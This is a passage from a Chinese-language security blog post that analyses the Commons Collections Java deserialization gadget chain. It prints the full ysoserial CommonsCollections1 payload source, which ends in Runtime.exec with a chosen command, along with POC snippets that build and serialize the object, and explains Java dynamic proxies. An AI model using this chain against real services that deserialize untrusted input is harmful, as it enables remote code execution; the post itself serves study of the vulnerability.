</span></span><span style=display:flex><span>            <span style=color:#111>Object</span> <span style=color:#111>var8</span> <span style=color:#f92672>=</span> <span style=color:#111>var5</span><span style=color:#f92672>.</span><span style=color:#75af00>getValue</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#f92672>(!</span><span style=color:#111>var7</span><span style=color:#f92672>.</span><span style=color:#75af00>isInstance</span><span style=color:#f92672>(</span><span style=color:#111>var8</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!(</span><span style=color:#111>var8</span> <span style=color:#00a8c8>instanceof</span> <span style=color:#111>ExceptionProxy</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#111>var5</span><span style=color:#f92672>.</span><span style=color:#75af00>setValue</span><span style=color:#f92672>((</span><span style=color:#00a8c8>new</span> <span style=color:#111>AnnotationTypeMismatchExceptionProxy</span><span style=color:#f92672>(</span><span style=color:#111>var8</span><span style=color:#f92672>.</span><span style=color:#75af00>getClass</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;[&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>var8</span> <span style=color:#f92672>+</span> <span style=color:#d88200>&#34;]&#34;</span><span style=color:#f92672>)).</span><span style=color:#75af00>setMember</span><span style=color:#f92672>((</span><span style=color:#111>Method</span><span style=color:#f92672>)</span><span style=color:#111>var2</span><span style=color:#f92672>.</span><span style=color:#75af00>members</span><span style=color:#f92672>().</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>var6</span><span style=color:#f92672>)));</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>代码比较好看懂，先是得到前面传入的Map（我们传入经过TransformedMap修饰的对象），之后依次遍历，到了<code>setValue</code>时会触发transform的回调</p><p>所以我们构造POC时需要创建<code>AnnotationInvocationHandler</code>对象，并把前面的<code>HashMap</code>传进来作为Map参数</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Class</span> <span style=color:#111>cls</span> <span style=color:#f92672>=</span> <span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>forName</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>Constructor</span> <span style=color:#111>construct</span> <span style=color:#f92672>=</span> <span style=color:#111>cls</span><span style=color:#f92672>.</span><span style=color:#75af00>getDeclaredConstructor</span><span style=color:#f92672>(</span><span style=color:#111>Class</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>Map</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>construct</span><span style=color:#f92672>.</span><span style=color:#75af00>setAccessible</span><span style=color:#f92672>(</span><span style=color:#00a8c8>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>InvocationHandler</span> <span style=color:#111>handler</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>InvocationHandler</span><span style=color:#f92672>)</span> <span style=color:#111>construct</span><span style=color:#f92672>.</span><span style=color:#75af00>newInstance</span><span style=color:#f92672>(</span><span style=color:#111>Retention</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>outerMap</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><p>同时因为AnnotationInvocationHandler是内部类不能直接new，我们用反射+setAccessible(true)的方式实例化；并且由于<code>Runtime.getRuntime</code>没有实现序列化的接口，所以我们用反射获取当前上下文的Runtime对象</p><p>另外，为了满足readObject中的<code>var7!=null</code>的判断，要满足</p><ul><li><code>sun.reflect.annotation.AnnotationInvocationHandler</code>构造函数的第一个参数为Annotation的子类，且必须至少含有一个方法，假设方法名为X</li><li>被<code>TransformedMap.decorate</code>修饰的Map中必有一个键名为X的元素</li></ul><p>8u71之后的版本修改了<code>AnnotationInvocationHandler</code>的readObject函数，不再使用反序列化得到的Map对象，而是新建了LinkedHashMap对象，把原来的key-value添加进去，所以后续对Map的操作都是基于这个<code>LinkedHashMap</code>对象，不会再触发set或put了</p><p>最后把对象生成序列化流</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>ByteArrayOutputStream</span> <span style=color:#111>barr</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ByteArrayOutputStream</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#111>ObjectOutputStream</span> <span style=color:#111>oos</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ObjectOutputStream</span><span style=color:#f92672>(</span><span style=color:#111>barr</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>writeObject</span><span style=color:#f92672>(</span><span style=color:#111>obj</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#111>oos</span><span style=color:#f92672>.</span><span style=color:#75af00>close</span><span style=color:#f92672>;</span>
</span></span></code></pre></div><h3 id=lazymap>LazyMap</h3><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> <span style=color:#111>ysoserial.payloads</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.InvocationHandler</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.HashMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.Transformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.ChainedTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.ConstantTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.functors.InvokerTransformer</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>org.apache.commons.collections.map.LazyMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>ysoserial.payloads.annotation.Authors</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>ysoserial.payloads.annotation.Dependencies</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>ysoserial.payloads.annotation.PayloadTest</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>ysoserial.payloads.util.Gadgets</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>ysoserial.payloads.util.JavaVersion</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>ysoserial.payloads.util.PayloadRunner</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>ysoserial.payloads.util.Reflections</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>/*
</span></span></span><span style=display:flex><span><span style=color:#75715e>	Gadget chain:
</span></span></span><span style=display:flex><span><span style=color:#75715e>		ObjectInputStream.readObject()
</span></span></span><span style=display:flex><span><span style=color:#75715e>			AnnotationInvocationHandler.readObject()
</span></span></span><span style=display:flex><span><span style=color:#75715e>				Map(Proxy).entrySet()
</span></span></span><span style=display:flex><span><span style=color:#75715e>					AnnotationInvocationHandler.invoke()
</span></span></span><span style=display:flex><span><span style=color:#75715e>						LazyMap.get()
</span></span></span><span style=display:flex><span><span style=color:#75715e>							ChainedTransformer.transform()
</span></span></span><span style=display:flex><span><span style=color:#75715e>								ConstantTransformer.transform()
</span></span></span><span style=display:flex><span><span style=color:#75715e>								InvokerTransformer.transform()
</span></span></span><span style=display:flex><span><span style=color:#75715e>									Method.invoke()
</span></span></span><span style=display:flex><span><span style=color:#75715e>										Class.getMethod()
</span></span></span><span style=display:flex><span><span style=color:#75715e>								InvokerTransformer.transform()
</span></span></span><span style=display:flex><span><span style=color:#75715e>									Method.invoke()
</span></span></span><span style=display:flex><span><span style=color:#75715e>										Runtime.getRuntime()
</span></span></span><span style=display:flex><span><span style=color:#75715e>								InvokerTransformer.transform()
</span></span></span><span style=display:flex><span><span style=color:#75715e>									Method.invoke()
</span></span></span><span style=display:flex><span><span style=color:#75715e>										Runtime.exec()
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>	Requires:
</span></span></span><span style=display:flex><span><span style=color:#75715e>		commons-collections
</span></span></span><span style=display:flex><span><span style=color:#75715e> */</span>
</span></span><span style=display:flex><span><span style=color:#75af00>@SuppressWarnings</span><span style=color:#f92672>({</span><span style=color:#d88200>&#34;rawtypes&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;unchecked&#34;</span><span style=color:#f92672>})</span>
</span></span><span style=display:flex><span><span style=color:#75af00>@PayloadTest</span> <span style=color:#f92672>(</span> <span style=color:#111>precondition</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;isApplicableJavaVersion&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75af00>@Dependencies</span><span style=color:#f92672>({</span><span style=color:#d88200>&#34;commons-collections:commons-collections:3.1&#34;</span><span style=color:#f92672>})</span>
</span></span><span style=display:flex><span><span style=color:#75af00>@Authors</span><span style=color:#f92672>({</span> <span style=color:#111>Authors</span><span style=color:#f92672>.</span><span style=color:#75af00>FROHOFF</span> <span style=color:#f92672>})</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>CommonsCollections1</span> <span style=color:#00a8c8>extends</span> <span style=color:#111>PayloadRunner</span> <span style=color:#00a8c8>implements</span> <span style=color:#111>ObjectPayload</span><span style=color:#f92672>&lt;</span><span style=color:#111>InvocationHandler</span><span style=color:#f92672>&gt;</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>public</span> <span style=color:#111>InvocationHandler</span> <span style=color:#75af00>getObject</span><span style=color:#f92672>(</span><span style=color:#00a8c8>final</span> <span style=color:#111>String</span> <span style=color:#111>command</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>final</span> <span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>execArgs</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span> <span style=color:#111>command</span> <span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>		<span style=color:#75715e>// inert chain for setup
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#00a8c8>final</span> <span style=color:#111>Transformer</span> <span style=color:#111>transformerChain</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ChainedTransformer</span><span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>			<span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]{</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>)</span> <span style=color:#f92672>});</span>
</span></span><span style=display:flex><span>		<span style=color:#75715e>// real chain for after setup
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>		<span style=color:#00a8c8>final</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#111>transformers</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Transformer</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>				<span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>Runtime</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>				<span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;getMethod&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>					<span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>Class</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span> <span style=color:#f92672>},</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>					<span style=color:#d88200>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>]</span> <span style=color:#f92672>}),</span>
</span></span><span style=display:flex><span>				<span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;invoke&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>					<span style=color:#111>Object</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span><span style=color:#f92672>[].</span><span style=color:#75af00>class</span> <span style=color:#f92672>},</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>					<span style=color:#00a8c8>null</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#f92672>[</span><span style=color:#111>0</span><span style=color:#f92672>]</span> <span style=color:#f92672>}),</span>
</span></span><span style=display:flex><span>				<span style=color:#00a8c8>new</span> <span style=color:#111>InvokerTransformer</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;exec&#34;</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>					<span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]</span> <span style=color:#f92672>{</span> <span style=color:#111>String</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span> <span style=color:#f92672>},</span> <span style=color:#111>execArgs</span><span style=color:#f92672>),</span>
</span></span><span style=display:flex><span>				<span style=color:#00a8c8>new</span> <span style=color:#111>ConstantTransformer</span><span style=color:#f92672>(</span><span style=color:#111>1</span><span style=color:#f92672>)</span> <span style=color:#f92672>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>final</span> <span style=color:#111>Map</span> <span style=color:#111>innerMap</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>final</span> <span style=color:#111>Map</span> <span style=color:#111>lazyMap</span> <span style=color:#f92672>=</span> <span style=color:#111>LazyMap</span><span style=color:#f92672>.</span><span style=color:#75af00>decorate</span><span style=color:#f92672>(</span><span style=color:#111>innerMap</span><span style=color:#f92672>,</span> <span style=color:#111>transformerChain</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>final</span> <span style=color:#111>Map</span> <span style=color:#111>mapProxy</span> <span style=color:#f92672>=</span> <span style=color:#111>Gadgets</span><span style=color:#f92672>.</span><span style=color:#75af00>createMemoitizedProxy</span><span style=color:#f92672>(</span><span style=color:#111>lazyMap</span><span style=color:#f92672>,</span> <span style=color:#111>Map</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>final</span> <span style=color:#111>InvocationHandler</span> <span style=color:#111>handler</span> <span style=color:#f92672>=</span> <span style=color:#111>Gadgets</span><span style=color:#f92672>.</span><span style=color:#75af00>createMemoizedInvocationHandler</span><span style=color:#f92672>(</span><span style=color:#111>mapProxy</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#111>Reflections</span><span style=color:#f92672>.</span><span style=color:#75af00>setFieldValue</span><span style=color:#f92672>(</span><span style=color:#111>transformerChain</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;iTransformers&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>transformers</span><span style=color:#f92672>);</span> <span style=color:#75715e>// arm with actual transformer chain
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>return</span> <span style=color:#111>handler</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#00a8c8>final</span> <span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>		<span style=color:#111>PayloadRunner</span><span style=color:#f92672>.</span><span style=color:#75af00>run</span><span style=color:#f92672>(</span><span style=color:#111>CommonsCollections1</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>,</span> <span style=color:#111>args</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>boolean</span> <span style=color:#75af00>isApplicableJavaVersion</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>JavaVersion</span><span style=color:#f92672>.</span><span style=color:#75af00>isAnnInvHUniversalMethodImpl</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>ysoserial用的是与TransformedMap类似的LazyMap，两者的区别在于TransformedMap是在执行put操作时回调transform，而LazyMap是在get方法中执行的factory.transform，在get找不到值才会调用factory.transform去获取一个值（所谓Lazy</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>key</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>if</span><span style=color:#f92672>(</span><span style=color:#111>map</span><span style=color:#f92672>.</span><span style=color:#75af00>containsKey</span><span style=color:#f92672>(</span><span style=color:#111>key</span><span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#00a8c8>false</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>		<span style=color:#111>Object</span> <span style=color:#111>value</span> <span style=color:#f92672>=</span> <span style=color:#111>factory</span><span style=color:#f92672>.</span><span style=color:#75af00>transform</span><span style=color:#f92672>(</span><span style=color:#111>key</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>		<span style=color:#111>map</span><span style=color:#f92672>.</span><span style=color:#75af00>put</span><span style=color:#f92672>(</span><span style=color:#111>key</span><span style=color:#f92672>,</span> <span style=color:#111>value</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>		<span style=color:#00a8c8>return</span> <span style=color:#111>value</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>	<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>return</span> <span style=color:#111>map</span><span style=color:#f92672>.</span><span style=color:#75af00>get</span><span style=color:#f92672>(</span><span style=color:#111>key</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>LazyMap的利用比TransformedMap复杂，因为AnnotationInvocationHandler覆写的readObject中并没有直接使用Map的get，所以这里选择通过java对象代理的技术来触发它的invoke 进而到get</p><p>我们知道对象代理可以在运行期动态创建某个<code>interface</code>的实例，可以编写<code>InvocationHandler</code>来实现接口的方法调用，可以做到加工和覆写（也正是叫做Proxy的原因 对接口进行Proxy 省去中间类），类似PHP魔术方法中的<code>__call</code> 可以劫持对象内部的方法调用，用到java.reflect.Proxy</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>Map</span> <span style=color:#111>proxyMap</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Map</span><span style=color:#f92672>)</span> <span style=color:#111>Proxy</span><span style=color:#f92672>.</span><span style=color:#75af00>newProxyInstance</span><span style=color:#f92672>(</span><span style=color:#111>Map</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getClassLoader</span><span style=color:#f92672>(),</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>Map</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span> <span style=color:#111>handler</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><p>第一个参数ClassLoader我们使用默认的即可，第二个是我们需要代理的对象集合，第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体的代理逻辑</p><p>比如一个覆写了invoke方法的ExampleInvocationHandler类</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.InvocationHandler</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Method</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>ExampleInvocationHandler</span> <span style=color:#00a8c8>implements</span> <span style=color:#111>InvocationHandler</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>protected</span> <span style=color:#111>Map</span> <span style=color:#111>map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#75af00>ExampleInvocationHandler</span><span style=color:#f92672>(</span><span style=color:#111>Map</span> <span style=color:#111>map</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>map</span> <span style=color:#f92672>=</span> <span style=color:#111>map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#111>Object</span> <span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#111>Object</span> <span style=color:#111>proxy</span><span style=color:#f92672>,</span> <span style=color:#111>Method</span> <span style=color:#111>method</span><span style=color:#f92672>,</span> <span style=color:#111>Object</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Throwable</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span><span style=color:#f92672>(</span><span style=color:#111>method</span><span style=color:#f92672>.</span><span style=color:#75af00>getName</span><span style=color:#f92672>().</span><span style=color:#75af00>compareTo</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;get&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>==</span> <span style=color:#111>0</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>            <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Hookmethod: &#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>method</span><span style=color:#f92672>.</span><span style=color:#75af00>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#d88200>&#34;Hacked Object&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>return</span> <span style=color:#111>method</span><span style=color:#f92672>.</span><span style=color:#75af00>invoke</span><span style=color:#f92672>(</span><span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>map</span><span style=color:#f92672>,</span> <span style=color:#111>args</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>作用是监控到调用的方法名是get时返回Hacked Object字符串，我们尝试外部调用它</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.InvocationHandler</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.lang.reflect.Proxy</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.HashMap</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> <span style=color:#111>java.util.Map</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>App</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>main</span><span style=color:#f92672>(</span><span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>args</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>InvocationHandler</span> <span style=color:#111>handler</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ExampleInvocationHandler</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>HashMap</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Map</span> <span style=color:#111>proxyMap</span> <span style=color:#f92672>=</span> <span style=color:#f92672>(</span><span style=color:#111>Map</span><span style=color:#f92672>)</span><span style=color:#111>Proxy</span><span style=color:#f92672>.</span><span style=color:#75af00>newProxyInstance</span><span style=color:#f92672>(</span><span style=color:#111>Map</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>.</span><span style=color:#75af00>getClassLoader</span><span style=color:#f92672>(),</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Class</span><span style=color:#f92672>[]{</span><span style=color:#111>Map</span><span style=color:#f92672>.</span><span style=color:#75af00>class</span><span style=color:#f92672>},</span> <span style=color:#111>handler</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>
